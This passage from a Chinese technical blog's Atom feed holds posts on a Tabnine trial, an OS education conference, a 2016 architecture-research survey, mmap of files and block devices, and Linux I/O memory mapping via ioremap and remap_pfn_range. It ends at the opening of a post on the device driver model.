<p>这个索引大小还有两点想分享。首先，这个索引大小是所有的源代码文件，不包含二进制文件。而且可以配置索引包含或不包含哪些目录，所以100MB估计可以cover大部分工程。另外值得一提的就是，这个限制不是一个硬性限制，而是类似一个滑动窗口的大小。比如我可以在一个超过400K的工程中使用免费版的400K的额度，只不过给我提示补全的建议是基于400K的代码数据，而不是整个工程的数据。这400K的窗口会随着编辑文件进行滑动，从而始终保证能够给出补全建议。</p>
<h2 id="可能的使用场景">可能的使用场景</h2><p>整个体验下来，感觉tabnine的补全提示还是不够智能，但是比较惊喜的是它能感知到上下文。我虽然不能用它通过注释的自然语言直接转换成可用的代码，但是它可以利用我输入的只言片语联想到源文件中出现过的代码片段。也就是说，tabnine很适合做一些模板感很强、重复性很强的代码编写，类似写 setter/getter以及写 HTTP 页面的感觉。对于一些没有明显重复模式、实验性很强的代码，比如编写算法、试探API，tabnine 可能就没什么用武之地了。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>tabnine 已经推出大半年了，网上资料很少，中文网站更是只限于翻译其广告大吹“AI辅助写代码神器”，也没有个正经使用报告。于是我写这篇文章分享一下实际使用的体验。</p>]]>
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[开源操作系统技术年会会后杂谈]]></title>
    <link href="https://freemandealer.github.io/gallery/2016/12/18/open-source-operating-system-annual-technical-conference/"/>
    <id>https://freemandealer.github.io/gallery/2016/12/18/open-source-operating-system-annual-technical-conference/</id>
    <published>2016-12-18T01:48:08.000Z</published>
    <updated>2016-12-18T01:58:31.000Z</updated>
    <content type="html"><![CDATA[<p>虽然是技术年会，我却跑去听了教育专题研讨论分会场。意外的是，这个分会给了我很多启发。</p>
<a id="more"></a>
<p>首先超级感动：国内高校有这么多有责任心的老师，认认真真思考教育、了解学生，热情洋溢地交流教学方法。他们是上海交大软院院长臧斌宇（2002年就开始的系统化教学改革）、北京大学陈向群（主持人）、北航王雷（利用数据分析学生实验行为）、复旦的张亮／高建（AIM教学内核,github: davidgao）。</p>
<p>听完报告，我果然很遗憾自己的操作系统课程水水就过去了。悲哉！难得自己对操作系统那么感兴趣，去没有最大程度地被引导利用。好想回本科系统地学习、实验一遍。另外一个听会感受是：写内核对本科生的要求算很高，就算是北大、上交这类层次的学校，每年也只有二三十人的“拔尖班”学生有能力进行内核开发（开发自己的玩具内核或修改教学内核），然而工业界对系统知识人才目前有求贤若渴之感。那缺失的这部分人才在哪里呢？好在研究生和几年工作经验的人稍稍补上了这类缺口。</p>
<p>我从大一下学期开始，就对计算机底层运行机制非常感兴趣。没记错的话，把注意力真正转移到内核设计实现是在大二上邂逅了日本人的那本《30天》，大二下选修了操作系统概念这门课。然而课如其名，真的只是教“概念”，颇有学习文科课程之感。当时这门课的小实验是unix/linux环境系统编程，就是使用一些API进行多进程、多线程编程。一开始我觉得莫名其妙、浅尝辄止（我想知道fork怎么实现，而不是学习如何利用fork！），不过今天听了上交臧斌宇老师的观点，他认为通过这些系统调用，了解操作系统内核暴露给用户的接口，是学习操作系统一个比较好的切入点。除了小实验，这门课的课程设计是漫无目的地自个儿琢磨uCOS，老师除了布置这个实验外其它一句话没说。听说南信大另外一个教授操作系统的王进老师的实验是在用户态模拟一些内核行为，如内存分配——虽然和上交拔尖班直接真实内核环境编程还差很远，但是上交臧斌宇老师自己也说了，内核编程不能强迫每个同学去做。大学里水完了操作系统这门课，有幸从恩师王金伟那得到一个课题，注意力转移到了Linux内核编程。课题为期一年，这个过程让我深刻体会到操作系统概念教程这门课和实际内核开发之间的鸿沟。在磕磕绊绊完成课题后，也就是大四上学期的尾巴到寒假这两个多月，我参照《Orange’s》设计自己的内核，实现了bootloader、系统调用框架、多进程轮转切换。和复旦高建同学（新偶像！）自己编写的特性丰富的AIM教学内核比起来，我的非常原始。</p>
<p>悔恨的我一度想捧起教科书重新学习操作系统，一度想掏出两年前自己写的内核好好完善完善。可是错过了就是错过了，从另外一个角度看，也没有必要。现在反思操作系统这门课，我觉得课程的目的是理解操作系统，再通过操作系统在系统结构整个领域中至关重要的位置，发散着去理解整个计算机结构，让学生成为一个对“系统知识”有“知识系统”的人，从而能在这个基础上做出自己的工作。而不是，把重新造轮子当作工作，抑或是为了理解操作系统而去理解操作系统，那顶多是解解好奇之渴，作为一个研究生我不能满足于此。操作系统考了多高的分数，实验做得多么精妙绝伦，本身都不是目的，对系统结构整体观念的把握能力是我们该好好培养的。</p>
<center><br><img src="/img/open-source-operating-system-annual-technical-conference.jpg" alt=""><br></center>]]></content>
    <summary type="html">
    <![CDATA[<p>虽然是技术年会，我却跑去听了教育专题研讨论分会场。意外的是，这个分会给了我很多启发。</p>]]>
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[2016年计算机体系结构领域研究热点调研报告]]></title>
    <link href="https://freemandealer.github.io/gallery/2016/12/16/2016-architecture-research-hotspot/"/>
    <id>https://freemandealer.github.io/gallery/2016/12/16/2016-architecture-research-hotspot/</id>
    <published>2016-12-16T01:08:23.000Z</published>
    <updated>2016-12-16T01:21:02.000Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>2016年计算机体系结构领域研究热点有哪些？为回答这个问题，本文分析了2016年CCF推荐会议中124篇关于计算机体系结构的前沿论文，对其研究主题进行分类和统计，归纳出了“新领域－老问题矩阵”。本文记录了这个矩阵的构成，以及通过这个矩阵得到的一些有意思的发现。</p>
</blockquote>
<a id="more"></a>
<h3 id="1-_研究方法和原始数据">1. 研究方法和原始数据</h3><p>调研遍历了2016年CCF(中国计算机学会)推荐国际学术会议列表(以下简称列表)124篇计算机体系结构领域的论文，通过分析论文标题、关键词、摘要、引言等内容，提取研究主题。这些论文，来自列表A类会议中的前三个：ASPLOS (Architectural Support for Programming Languages and Operating Systems)、FAST (Conference on File and Storage Technologies)和 HPCA(High-Performance Computer Architecture)。</p>
<p>按照这个方法，我们获得一张包含134个项目的表格，作为研究分析的原始数据。在分析论文研究主题的过程中，我发现部分论文的描述自己的研究主题采取一定格式：首先介绍大领域，接着介绍具体的问题，最后提出自己的解决方法。例如，一篇文章的研究内容可能是NVM (大领域)的功耗 (具体问题)，然后以”in this paper”引出自己的解决方案。在满足这个特征的论文中我还发现两个特性：大领域往往是一些热门技术，如NVM、事务内存等。而那些大领域下的具体问题，往往是一些共性的、经典的问题，如：功耗、可靠性等。基于这些特征，我把原始数据根据论文研究主题整理出一个表格，称之为“新领域－老问题矩阵”。矩阵剔除了部分与体系结构关系不密切的文章。</p>
<center><br><img src="/img/new_tech_old_problem.png" alt=""><br></center>

<p>下面具体描述新领域－老问题矩阵的构成。矩阵深灰色区域每一格代表一个“新领域”，浅灰色每一格代表一个“老问题”，浅色区域每个格子中的每个数值为一篇论文在本研究中的序号，多篇论文用逗号分开。格子的行列表示这篇论文研究的主题是行代表的“新领域”和列代表的“老问题”相结合。需要注意的是，不是所有的论文都满足上文中提到的三项特征，它们被列举在other一栏。”新领域“的other（行）表示主题为未列出的其它领域技术但是具有对应”老问题“的文章，问题的other（列）表示主题为未列出的其它问题可被归为对应”新领域“的文章。而落入“other领域-other问题”中的文章，是讨论其它技术领域的其它问题的文章，或者是完全不符合上述特征的、极具想象力的文章。</p>
<h3 id="2-_结论">2. 结论</h3><p><strong>结论一：热门领域有这些</strong></p>
<p>上面给出的“新领域－老问题矩阵”中，深色和浅灰色部分分别给出了热门研究领域和热门研究问题。其中热门领域包括：flash、GPU/GPGPU、NVM、并行／分布式／云计算、多核／众核、事务内存、CPU和微体系结构、数据中心、文件系统／存储系统、异构计算、新的存储技术、加速器、互连网络／片上网络、模糊计算、可重构硬件、虚拟化、移动计算、物联网。热门研究问题包括：安全性、可靠性、功耗、缓存、并发一致性、QoS／资源分配、性能、内存管理、I/O、反冗余、冷却。当然，“other领域-other问题”一格中还有一些讨论其它主题的论文，由于在本调研中这些论文研究的主题出现仅一次，暂时认为其不具备“热门”特征的。</p>
<p>如果把“新领域－老问题矩阵”中每一格内容由原来的论文编号替换成格子中包含的论文数量，那么可以得到“新技术－老问题计数矩阵”。</p>
<center><br><img src="/img/new_tech_old_problem_count.png" alt=""><br></center>

<p>计数矩阵的最右列是以该“新领域”为研究主题论文数量的总计。同样，最后一行是以每个“老问题”为讨论主题论文数量的总计。我们很容易发现，讨论激烈的新领域集中在Flash、GPU/GPGPU、NVM、并行／分布式／云计算、事务内存、CPU／微体系结构。研究问题集中在安全／可靠性、功耗方面。</p>
<p><strong>结论二：以“新技术－老问题”为主题的研究较普遍</strong></p>
<p>根据新技术－老问题计数矩阵，我绘制了下图：</p>
<center><br><img src="/img/surface.png" alt=""><br></center>

<p>图中，横轴、纵轴与矩阵的行、列对应，分别表示新技术／热门领域和共性问题。锥形的高度表示相应“新领域－老问题”论文的数量。从图中可以看出，靠近坐标轴的other部分相对突出（对应矩阵的深色和浅灰色部分），但中间部分也占据相当分量（对应矩阵白色部分）。这表明“新技术－老问题”为主题的研究较普遍。研究者会在新兴的技术被提出后，联系之前自己的研究经历，使用一些经典评价指标和通用分析方法去评价新技术，如果存在问题，那么着手研究解决方案。我们看到研究相对集中的几个热门领域，如：Flash、GPU/GPGPU、NVM、并行／分布式／云计算、事务内存、CPU／微体系结构，与相对集中的几个热门研究问题，如：安全／可靠性、功耗，两者交织情况十分显著。</p>
<h3 id="3-_启发">3. 启发</h3><p><strong>启发一：围绕矩阵发掘研究主题</strong></p>
<p>研究过程得到的新领域－老问题矩阵，不仅仅定位了2016年体系结构领域的的研究前沿热点，还提供了一些启发：这个矩阵作为一种文献主题归类方式和分析方法，可以被用来分类、理解其它论文的研究内容。更重要的是，它可以被用来挖掘潜在的研究主题。</p>
<p><strong>启发二：基准 -&gt; 新设计， 特征 -&gt; 新设计</strong></p>
<p>在分析文章的过程中，我发现部分文章的工作集中在提出了一种新的基准 (benchmark)，并利用自己的基准去评价现有系统，发现系统不足，接着提出改进方案或是新的设计。这意味着，提出一种新的基准，可以作为研究的一个可能的起点。另一个起点可能是特征分析。调研过程中浏览的一些文章开始于系统、应用场景特征的分析。得到特征分析结果后，再针对性地提出改进或新的设计。</p>
<p><strong>启发三：合作</strong></p>
<p>被分析的论文中，有大量工作是由多个研究机构共同完成的，体现出科研领域合作的重要性。值得一提的是，大量的合作来自大学和工业界共同建立。如Google和德州大学奥斯汀分校、耶鲁大学和多伦多大学有良好的合作。在它们合作的文章中，Google不仅积极参与研究，同时提供了真实应用环境。这样的结合，提升了学术成果实用价值，加速了技术到市场的转换效率。国内，华为公司跟一些学术机构也保持同样的合作关系。</p>
<h3 id="4-_未来工作">4. 未来工作</h3><p>由于时间有限，本工作调研的文章数量极为有限，通过增加会议数量会使得热门领域的判断更加准确且完备。如果能扩展调研论文的发表年份，会为结论增加时间维度，得到热门领域的变迁关系。</p>
<p>本文是按照CCF推荐列表展开调研的，而从实验室角度展开调查或许是另一个增强结论、发现新结论的方法。具体说，可以从国际上影响力较大实验室的项目和发表论文中获取一些信息，分析研究主题，有可能得到一些有意思的结论。</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>2016年计算机体系结构领域研究热点有哪些？为回答这个问题，本文分析了2016年CCF推荐会议中124篇关于计算机体系结构的前沿论文，对其研究主题进行分类和统计，归纳出了“新领域－老问题矩阵”。本文记录了这个矩阵的构成，以及通过这个矩阵得到的一些有意思的发现。</p>
</blockquote>]]>
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[理解mmap]]></title>
    <link href="https://freemandealer.github.io/gallery/2016/10/20/understanding-mmap/"/>
    <id>https://freemandealer.github.io/gallery/2016/10/20/understanding-mmap/</id>
    <published>2016-10-20T10:38:30.000Z</published>
    <updated>2016-10-20T10:59:01.000Z</updated>
    <content type="html"><![CDATA[<h2 id="mmap普通文件">mmap普通文件</h2><p>小时候，我以为mmap就是用来把磁盘上的文件加载到内存中，是除了read/write系统调用外，读写文件的另一种方式。使用read/write系统调用读写文件时，我们需要提供一个指针，表明我们需要读写文件的位置。同时需要指明内存缓冲区的地址及其大小，来让read把文件的某一部分存进缓冲区，或是让write把缓冲区的数据写进文件的指定位置。如果使用mmap，系统会把整个文件一次性读取到内存中（对用户来说是一次性，但实现时可以使用缺页异常的方法按需读取，该操作对用户透明）。这段内存就成了磁盘中文件的映像，操作系统会把我们对这片内存的操作，同步到磁盘上。对于用户来说，操作这片内存就是在操作文件。</p>
<a id="more"></a>
<h2 id="mmap设备文件">mmap设备文件</h2><p>后来，当我看到设备文件也能被mmap到内存中，我开始尝试理解mmap这个称谓的由来—— 原来 memory map，就是把一段memory映射到其它memory空间的过程！设备驱动的作者通过书写自己的mmap回调函数，就可以引导操作系统把设备上的存储空间映射到进程虚拟地址空间上。对于用户来说，操作这片内存，就是在操作设备（上的存储器）。</p>
<h2 id="“统一”的混乱">“统一”的混乱</h2><h3 id="回头再看mmap普通文件错误但深刻的理解">回头再看mmap普通文件错误但深刻的理解</h3><p>回想mmap把磁盘上的文件加载到内存的过程，和mmap设备文件的过程竟是完美统一的—— 感谢“一切皆设备”的unix理念！其实不仅设备文件本身也是文件，而且存储文件的磁盘也是设备。这样一来，mmap普通文件，是不是就是在mmap磁盘上某个文件占用的设备memory呢？当设备是可直接访存(如NVDIMM盘)的情况下也许想法是正确，但多数情况下不是这样的。为什么呢？</p>
<p>因为mmap的目的就是想把对设备memory的操作抽象成对内存的操作。如果CPU没有办法直接寻址设备的memory，那么mmap本身是没有意义的。</p>
<p>不幸的是，我们常见的机械硬盘、SSD啥的都没有把存储单元暴露给CPU，所以文件就得先读到内存中，再对内存进行操作，最后同步回设备。相比于直接操作SSD上的存储颗粒，这种做法是不是有一种“缓冲”的意思呢？</p>
<h3 id="mmap块设备自身">mmap块设备自身</h3><p>一切皆设备的unix设计的大一统理念虽然完美，不过可能会造成一点混乱…… 除了上面说的：错误地认为mmap普通文件就是mmap磁盘上某个文件占用的设备memory，下面谈谈另一个疑虑——mmap一个磁盘块设备自己（块设备文件）会出现什么情况，跟我mmap这个磁盘块设备上的普通文件，有什么不同？</p>
<p>我们可以尝试写一个简单的例子看看mmap块设备文件会发生啥情况：</p>
<pre><code>filp = fopen(“/dev/sda”, “r")<span class="comment">;</span>
fd = fileno(filp)<span class="comment">;</span>
buf = mmap(NULL, SIZE, PROT_READ, MAP_PRIVATE, fd, 0)<span class="comment">;</span>
for (i=0<span class="comment">; i&lt;SIZE; i++)</span>
     printf(“%x”, buf[i])<span class="comment">;</span>
munmap(buf, SIZE)<span class="comment">;</span>
fclose(filp)<span class="comment">;</span>
</code></pre><p>输出结果（部分）：</p>
<pre><code><span class="number">63</span>eb1090ffffd08ebcffffb8b00ffffd88effffc08effffbefb7c00bfffffb906200ffffa4f321ea6ffffbe00
<span class="number">7</span>be438b75ffffc683ffff8110fffffefe7507ffffebf3ffffb416ffffb002ffffbb017c00ffff80b2748affff
...
</code></pre><p>再看看磁盘头一个扇区的数据（部分）：</p>
<pre><code>eb63 <span class="number">9010</span> <span class="number">8</span>ed0 bc00 b0b8 <span class="number">0000</span> <span class="number">8</span>ed8 <span class="number">8</span>ec0
fbbe <span class="number">007</span>c bf00 <span class="number">06</span>b9 <span class="number">0002</span> f3a4 ea21 <span class="number">0600</span>
...
</code></pre><p>忽略读数据时大小端的影响，是不是同一个东西？实验说明，mmap一个块设备文件，就相当于把整块磁盘给mmap了（而不是胡思乱想的什么mmap磁盘控制器页面啦、什么设备上的缓冲区啦等等高级的东西！）。这个mmap跟磁盘上的具体文件系统无关（所谓绕过文件系统），而是把磁盘作为一个超级大的、数据块都是连续的文件给mmap进虚拟内存了。相反看mmap磁盘块设备上的一个普通文件，是跟磁盘上的文件系统息息相关的——这个mmap操作本身就是在这个文件系统提供的。mmap普通文件的数据块在磁盘上不一定是连续的，需要文件系统给出了索引数据块的方法。</p>
<p>扩展阅读：</p>
<p><a href="http://hemming.blog.hexun.com/15094457_d.html" target="_blank" rel="external">malloc背后的故事</a>mmap在进程内存分配中扮演的角色及其它一些与文件相关的系统调用。</p>
<p><a href="http://alanwu.blog.51cto.com/3652632/1288838" target="_blank" rel="external">一个IO的传奇一生</a> 介绍了mmap块设备文件和普通文件的区别。不止于此，这个系列对文件系统和块设备IO有总结性的讲解。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="mmap普通文件">mmap普通文件</h2><p>小时候，我以为mmap就是用来把磁盘上的文件加载到内存中，是除了read/write系统调用外，读写文件的另一种方式。使用read/write系统调用读写文件时，我们需要提供一个指针，表明我们需要读写文件的位置。同时需要指明内存缓冲区的地址及其大小，来让read把文件的某一部分存进缓冲区，或是让write把缓冲区的数据写进文件的指定位置。如果使用mmap，系统会把整个文件一次性读取到内存中（对用户来说是一次性，但实现时可以使用缺页异常的方法按需读取，该操作对用户透明）。这段内存就成了磁盘中文件的映像，操作系统会把我们对这片内存的操作，同步到磁盘上。对于用户来说，操作这片内存就是在操作文件。</p>]]>
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux如何操作设备中的存储器？]]></title>
    <link href="https://freemandealer.github.io/gallery/2016/10/07/io-memory/"/>
    <id>https://freemandealer.github.io/gallery/2016/10/07/io-memory/</id>
    <published>2016-10-07T10:52:35.000Z</published>
    <updated>2016-10-11T02:00:04.000Z</updated>
    <content type="html"><![CDATA[<p>对设备的操作实际上是通过读写设备中的memory或者register来完成的。操作方式有两种：I/O ports操作方式和I/O memory操作方式。前者存在于部分体系结构中，通过专门的IO指令(in/out)来实现。后者不需要特殊指令，允许我们像操作内存那样操作设备memory或者register，并可以封装前者，更为简单也更流行。这里我们讨论I/O memory的操作方式。在I/O memory操作方式下，设备中的memory或register被称作I/O memory[1]。那么Linux是如何操作I/O memory的呢？</p>
<a id="more"></a>
<p><img src="/img/io_memory_mapping.png" alt=""></p>
<p>如图所示，这个映射分为两部分。I/O memory首先要从设备视角下的局部内存地址空间映射到物理内存地址空间，主要由硬件完成。因为Linux工作在保护模式下，该模式下的CPU识别的是虚拟地址，物理内存地址并不能被直接使用，因此需要进一步地将物理地址空间映射到虚拟地址空间中去。</p>
<h2 id="地址空间的概念">地址空间的概念</h2><p>有必要解释“地址空间(address space)”这一概念：地址空间就是能看到的存储器范围。地址空间的大小不由具体存储器的容量决定，而是指CPU或其它控制器能访问到的存储器单元的范围，由电路的“位“来决定。例如32位的CPU的地址空间（不论虚拟的地址空间或是物理的地址空间）通常情况下就是0~4G(2^32)，即使内存只有1G。如果为32位CPU配上8G的内存条，超出了地址空间的4G存储单元就无法被CPU直接访问。</p>
<p>通过读取/proc/iomem可以查看物理地址空间的映射情况。</p>
<pre><code><span class="number">00000000</span>-<span class="number">00000f</span>ff : reserved
<span class="number">00001000</span>-<span class="number">0009</span>d7ff : System RAM
<span class="number">0009</span>d800-<span class="number">0009f</span>fff : reserved
<span class="number">000</span>a0000-<span class="number">000</span>bffff : PCI Bus <span class="number">0000</span>:<span class="number">00</span>  &lt;- PCI设备内存
<span class="number">000</span>c0000-<span class="number">000</span>cefff : Video ROM          &lt;- 显存
<span class="number">000e0000</span>-<span class="number">000f</span>ffff : reserved
  <span class="number">000f</span>0000-<span class="number">000f</span>ffff : System ROM       &lt;- BIOS
<span class="number">00100000</span>-bac8efff : System RAM
  <span class="number">01000000</span>-<span class="number">0173</span>ebc8 : Kernel code
  <span class="number">0173</span>ebc9-<span class="number">01</span>d1e9ff : Kernel data
  <span class="number">01e77000</span>-<span class="number">01f</span>e0fff : Kernel bss
bac8f000-bacacfff : reserved
bacad000-bacb8fff : ACPI Non-<span class="keyword">volatile</span> Storage
......
</code></pre><p>这个列表把物理地址空间的分布暴露得一丝不挂，以至于让Linus失去了安全感。但是鉴于部分应用(如kdump组件)依赖这些信息，所以这些信息目前依旧保留着。炫耀一下我是如何从Linus手中拯救出kernel code/data/bass段信息的 :P</p>
<p><img src="/img/save_iomem.png" alt=""></p>
<h2 id="从设备局部内存地址空间到物理地址空间的映射">从设备局部内存地址空间到物理地址空间的映射</h2><p>再次观察上面/proc/iomem文件的内容，我们发现物理地址空间对应的真实存储器不仅仅内存条上的存储单元，还有很多其它设备上的存储器（例如BIOS、显存等）。这些设备存储器是怎么“拼接”上去的呢？这就是从设备局部内存地址空间到物理地址空间的映射。</p>
<p><img src="/img/address_space.png" alt=""></p>
<p>这个映射主要是硬件完成的：在计算机早期时代，连接到计算机上后就只能映射到某一位置。这个位置是硬件设计时固定下来的。由于地址空间有限，而设备种类繁多，要使设备占用的地址空间不发生冲突就得为每种设备分配固定位置。这种做法显然不合适。后来，人们为了解决这个问题，把一些类型的设备映射到物理地址空间的位置设计成可以配置的，如PCI设备。为了做到可配置，PCI设备引入了配置空间。配置空间实际上是一系列的寄存器硬件。想要查看设备配置空间的状态，可以使用下面的命令查看导出到用户空间的映像[2]：</p>
<pre><code>zhangzy@huawei17:~$ lspci | grep VGA
<span class="number">07</span>:<span class="number">00.0</span> VGA compatible controller: Device <span class="number">19e5</span>:<span class="number">1711</span> (rev <span class="number">01</span>)
zhangzy@huawei17:~$ xxd /sys/bus/pci/devices/<span class="number">0000</span>\:<span class="number">07</span>\:<span class="number">00.0</span>/config
<span class="number">0000000</span>: e519 <span class="number">1117</span> <span class="number">0700</span> <span class="number">1000</span> <span class="number">0100</span> <span class="number">0003</span> <span class="number">0000</span> <span class="number">0000</span>  ................
<span class="number">0000010</span>: <span class="number">0800</span> <span class="number">0094</span> <span class="number">0000</span> <span class="number">6096</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span>  ......`.........
<span class="number">0000020</span>: <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span>  ................
<span class="number">0000030</span>: <span class="number">0000</span> <span class="number">0000</span> <span class="number">4000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0701</span> <span class="number">0000</span>  ....@...........
</code></pre><p>下面我们验证config文件里的这些内容就是配置空间的映像。我们知道/proc/iomem里面存放了内存布局（物理地址空间布局），而配置空间的第0x10个字节往后都是基地址，也即映射到物理地址空间后的首地址。以第一个基址0x94000000为例，我们可以在iomem里找到对应的条目——它正是0000:07:00.0VGA设备！</p>
<pre><code>zhangzy@huawei17:~$ cat /proc/iomem | grep <span class="number">9400</span>
  <span class="number">94000000</span>-<span class="number">95f</span>fffff : PCI Bus <span class="number">0000</span>:<span class="number">07</span>
    <span class="number">94000000</span>-<span class="number">95f</span>fffff : <span class="number">0000</span>:<span class="number">07</span>:<span class="number">00.0</span>
      <span class="number">94000000</span>-<span class="number">9412f</span>fff : vesafb
</code></pre><p>配置空间本质上是一组寄存器，可以在CPU发送的命令（x86的IO指令）控制下进行读写。相反，真正的 I/O memory一开始并不能被访问——直到配置完成。完成整个配置动作的是BIOS，准确说是BIOS中的固件中的代码。BIOS固件代码基本是不开源的；不过好消息是，由于不是所有架构平台都有BIOS，所以跨平台的Linux也支持亲力亲为的配置方式（本质上没差别，因为配置指令由CPU发出，而CPU并不关心这条指令来自固件还是内存中的内核代码）。所以好奇的读者可以阅读Linux内核相关源代码学习配置的具体过程，这部分内容Linux称之为resource(地址空间也是有限的资源！它的大小受总线位数限制)的管理。现在我们恍然大悟，原来/proc/iomem里的内容的来源就是这些resource呀！</p>
<h2 id="物理内存到虚拟地址空间的映射">物理内存到虚拟地址空间的映射</h2><p>因为Linux工作在保护模式下，该模式下的CPU识别的是虚拟地址，因此物理内存地址并不能被直接使用。将物理地址映射到虚拟地址的机制就是大名鼎鼎的页表机制。我们需要在页表中建立新的表项，让MMU把某些个虚拟地址和物理地址的某些个单元挂上钩完成第二级映射。我们刚刚了解到，到物理地址空间的映射由BIOS或内核完成，而这里利用页表完成的映射是由谁完成呢？当然是驱动啦，因为只有它对硬件的详细信息一清二楚，也只有它需要知道这个映射得到的虚拟地址。</p>
<p>修改个页表机制并没有那么简单，好在内核提供了一个高层次的API函数可以帮助我们建立映射：</p>
<pre><code><span class="keyword">void</span> __<span class="function">iomem * <span class="title">ioremap</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> offset, <span class="keyword">unsigned</span> <span class="keyword">long</span> size)</span></span>
</code></pre><p>参数offset是需要映射的物理地址，size是这段物理地址的大小。返回值是映射到的虚拟地址。这样，整个映射过程全部完成，内核可以使用ioremap返回的地址对I/O memory进行读写了。</p>
<pre><code>(<span class="keyword">char</span> *) addr = <span class="number">0x00</span>;
</code></pre><p>注意上面的访存方式可以在x86平台上使用。但考虑到跨平台，linux内核建议使用：</p>
<pre><code>writeb(<span class="number">0x00</span>, addr);
</code></pre><p>是不是封装得很好呢？用起来是不是很爽快呢？不过，上述代码只能在内核中使用，如果在用户空间使用上述代码访存，你得到的可能就是错误哦！</p>
<h2 id="用户空间直接读写I/O_memory">用户空间直接读写I/O memory</h2><p>ioremap是将物理地址映射到了虚拟地址空间，但虚拟地址空间又分为进程虚拟地址空间和内核虚拟地址空间…… 因为特权级保护的原因，用户进程是不能读写后者哒。不幸的是，ioremap映射到的正是内核虚拟地址空间。</p>
<p>我们知道操作系统内核是计算机软硬件资源的管理者。我们自己写的一些用户空间程序一般需要借助内核提供的接口(系统调用 or IOCTL)去访问设备，而不是自作主张去直接操作硬件。但有时候，为了提高性能，我们可能需要绕过操作系统这个管家亲自操作硬件。</p>
<p>那么我们要怎么做才对呢？答案：mmap[3]。我们需要在驱动程序中提供mmap方法，并在方法的实现中调用下面的函数帮助应用程序完成第二级映射——把I/O memory映射到的物理内存映射到自己的进程虚拟地址空间：</p>
<pre><code><span class="function"><span class="keyword">int</span> <span class="title">remap_pfn_range</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma, \
                            <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> pfn, \
                            <span class="keyword">unsigned</span> <span class="keyword">long</span> size, pgprot_t prot)</span></span>
</code></pre><p>其中vma参数表示进程虚拟地址空间的一个段，是映射的目的地。addr参数是这个段的首地址（虚拟地址）。参数pfn是page frame number，用来索引待映射的物理内存的页。在本文所描述的情况下，这段物理页其实就是上面把I/O memory从设备局部内存地址空间映射出来得到的物理页。size表示映射区域的大小，prot是一些内存保护标志。</p>
<p>这样，用户空间程序mmap完与设备相关的设备文件，就可以在I/O memory上为所欲为了。</p>
<h2 id="小结">小结</h2><p>为了访存设备memory或register，即I/O memory，我们需要建立两级映射：</p>
<pre><code><span class="comment">设备局部内存地址空间</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">kernel/BIOS</span><span class="literal">-</span><span class="literal">-</span>&gt; <span class="comment">物理地址空间</span> <span class="comment">—</span><span class="literal">-</span><span class="comment">ioremap</span><span class="literal">-</span><span class="literal">-</span>&gt; <span class="comment">内核虚拟地址空间</span>
</code></pre><p>如果想要用户空间程序直接具备访存I/O memory的能力，我们需要完成如下映射：</p>
<pre><code><span class="comment">设备局部内存地址空间</span> <span class="literal">-</span><span class="comment">—kernel/BIOS</span><span class="literal">-</span><span class="literal">-</span>&gt; <span class="comment">物理地址空间</span> <span class="comment">—</span><span class="literal">-</span><span class="comment">mmap</span><span class="literal">-</span><span class="literal">-</span>&gt; <span class="comment">进程虚拟地址空间</span>
</code></pre><h2 id="参考">参考</h2><p>J. Corbet, A. Rubini, Greg K.H.. Linux Device Driver, 3rd Edition. O’Reilly Media, Inc., 2005. 其中的三章：</p>
<p>[1] <a href="http://www.oreilly.com/openbook/linuxdrive3/book/ch09.pdf" target="_blank" rel="external">http://www.oreilly.com/openbook/linuxdrive3/book/ch09.pdf</a></p>
<p>[2] <a href="http://www.oreilly.com/openbook/linuxdrive3/book/ch12.pdf" target="_blank" rel="external">http://www.oreilly.com/openbook/linuxdrive3/book/ch12.pdf</a></p>
<p>[3] <a href="http://www.oreilly.com/openbook/linuxdrive3/book/ch15.pdf" target="_blank" rel="external">http://www.oreilly.com/openbook/linuxdrive3/book/ch15.pdf</a></p>
<blockquote>
<p>致谢：感谢刘洪亮、郝天舒两位同学在国庆期间将工位借我让我舒舒服服地写完此文。</p>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<p>对设备的操作实际上是通过读写设备中的memory或者register来完成的。操作方式有两种：I/O ports操作方式和I/O memory操作方式。前者存在于部分体系结构中，通过专门的IO指令(in/out)来实现。后者不需要特殊指令，允许我们像操作内存那样操作设备memory或者register，并可以封装前者，更为简单也更流行。这里我们讨论I/O memory的操作方式。在I/O memory操作方式下，设备中的memory或register被称作I/O memory[1]。那么Linux是如何操作I/O memory的呢？</p>]]>
    
    </summary>
    
      <category term="Notes" scheme="https://freemandealer.github.io/gallery/categories/Notes/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[设备驱动 - Linux Device Driver Model]]></title>
    <link href="https://freemandealer.github.io/gallery/2016/09/01/device-driver-linux-device-driver/"/>
    <id>https://freemandealer.github.io/gallery/2016/09/01/device-driver-linux-device-driver/</id>
    <published>2016-09-01T03:28:54.000Z</published>
    <updated>2016-09-01T05:27:43.000Z</updated>
    <content type="html"><![CDATA[<h2 id="写在前面">写在前面</h2><p>理解device driver model，我觉得最难的就是“忘掉自己曾经知道的”。学习内核很多情况下都需要这项技能：忘掉自己知道的，我们才不至于望文生义想当然，才能去接纳新知识，才能够耐着性子去阅读思考，才会更关注“为什么要这样呢”。所以如果刚接触Linux内核的你对设备驱动存在些许认识或者幻想，现在都请忘了吧。文中出现的术语如device、driver等，为了避免想当然，一开始都请把它当成一个名字而已，不要试图猜测其语义，也最好不要翻译成中文（所以请原谅文中的中英文混杂）。当我们理解了以后再看这些术语，我们就会恍然大悟它们为什么叫这个名字了。</p>
<a id="more"></a>
